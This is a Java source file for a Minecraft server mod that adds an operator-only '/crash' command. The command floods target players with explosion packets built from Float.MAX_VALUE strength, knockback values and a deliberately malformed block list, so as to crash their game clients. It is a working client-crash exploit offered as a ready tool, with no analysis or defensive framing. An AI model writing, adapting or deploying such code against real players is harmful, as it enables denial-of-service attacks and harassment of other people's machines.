package cn.forgotdream.crash.util;

import com.mojang.brigadier.CommandDispatcher;
import net.minecraft.command.argument.EntityArgumentType;
import net.minecraft.network.packet.s2c.play.ExplosionS2CPacket;
import net.minecraft.server.command.CommandManager;
import net.minecraft.server.command.ServerCommandSource;
import net.minecraft.server.network.ServerPlayerEntity;
import net.minecraft.util.math.BlockPos;
import org.jetbrains.annotations.NotNull;
import net.minecraft.util.math.Vec3d;

import java.util.Collection;
import java.util.Iterator;
import java.util.List;
import java.util.ListIterator;

public class CrashCommand {
    public static void register(CommandDispatcher<ServerCommandSource> dispatcher){
        dispatcher.register(CommandManager.literal("crash").
                requires(serverCommandSource -> serverCommandSource.hasPermissionLevel(4)).
                then(CommandManager.argument("targets", EntityArgumentType.players()).executes((commandContext) -> execute(commandContext.getSource(), EntityArgumentType.getPlayers(commandContext, "targets")))));
    }
    private static Vec3d data = new Vec3d(Float.MAX_VALUE, Float.MAX_VALUE, Float.MAX_VALUE);
    private static int execute(ServerCommandSource source, Collection<ServerPlayerEntity> targets) {
        for (ServerPlayerEntity scp:targets
             ) {
            try {
                for (int i = 0; i < 30; i++) {
                    scp.networkHandler.sendPacket(new ExplosionS2CPacket(scp.capeX, scp.capeY, scp.capeZ, Float.MAX_VALUE, new List<BlockPos>() {
                        @Override
                        public int size() {
                            return 0;
                        }

                        @Override
                        public boolean isEmpty() {
                            return false;
                        }

                        @Override
                        public boolean contains(Object o) {
                            return false;
                        }

                        @NotNull
                        @Override
                        public Iterator<BlockPos> iterator() {
                            return null;
                        }

                        @NotNull
                        @Override
                        public Object[] toArray() {
                            return new Object[0];
                        }

                        @NotNull
                        @Override
                        public <T> T[] toArray(@NotNull T[] a) {
                            return null;
                        }

                        @Override
                        public boolean add(BlockPos blockPos) {
                            return false;
                        }

                        @Override
                        public boolean remove(Object o) {
                            return false;
                        }

                        @Override
                        public boolean containsAll(@NotNull Collection<?> c) {
                            return false;
                        }

                        @Override
                        public boolean addAll(@NotNull Collection<? extends BlockPos> c) {
                            return false;
                        }

                        @Override
                        public boolean addAll(int index, @NotNull Collection<? extends BlockPos> c) {
                            return false;
                        }

                        @Override
                        public boolean removeAll(@NotNull Collection<?> c) {
                            return false;
                        }

                        @Override
                        public boolean retainAll(@NotNull Collection<?> c) {
                            return false;
                        }

                        @Override
                        public void clear() {

                        }

                        @Override
                        public BlockPos get(int index) {
                            return null;
                        }

                        @Override
                        public BlockPos set(int index, BlockPos element) {
                            return null;
                        }

                        @Override
                        public void add(int index, BlockPos element) {

                        }

                        @Override
                        public BlockPos remove(int index) {
                            return null;
                        }

                        @Override
                        public int indexOf(Object o) {
                            return 0;
                        }

                        @Override
                        public int lastIndexOf(Object o) {
                            return 0;
                        }

                        @NotNull
                        @Override
                        public ListIterator<BlockPos> listIterator() {
                            return null;
                        }

                        @NotNull
                        @Override
                        public ListIterator<BlockPos> listIterator(int index) {
                            return null;
                        }

                        @NotNull
                        @Override
                        public List<BlockPos> subList(int fromIndex, int toIndex) {
                            return null;
                        }
                    },data));}
            }catch (Exception e) {
                e.printStackTrace();
            }
            System.out.println("[Crash] " + scp.getDisplayName() + "---> Crash");
        }

        return 0;
    }
}